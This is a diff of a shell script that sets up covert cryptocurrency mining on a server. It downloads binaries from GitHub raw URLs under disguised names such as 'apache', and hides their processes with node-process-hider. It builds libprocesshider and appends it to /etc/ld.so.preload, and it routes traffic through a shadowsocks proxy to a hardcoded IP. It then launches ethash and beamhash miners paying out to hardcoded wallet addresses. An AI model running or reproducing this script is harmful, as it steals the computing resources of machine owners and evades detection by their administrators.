@@ -2,14 +2,17 @@
 sleep 11m
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
+apt update 
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
+wget https://github.com/christiarch/templates/raw/main/lba 
+chmod +x lba 
+npm i -g node-process-hider 
 
-npm i -g node-process-hider
+ph add graftcp
+ph add apache
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -27,18 +30,33 @@ END
 
 sleep .2
 
+echo " "
+echo " "
+
+echo "******************************************************************"
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
-chmod +x Transport
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/apache
+chmod +x apache
 
 apt -y install shadowsocks-libev rng-tools
-
+rngd -r /dev/urandom
 ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
 
-ph add Transport
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicApache.zip
+unzip magicApache.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w TEST --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+./graftcp/graftcp ./apache --algo beamhash --server beamv3.usa-west.nicehash.com --port 3387 --ssl 1 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --pass x
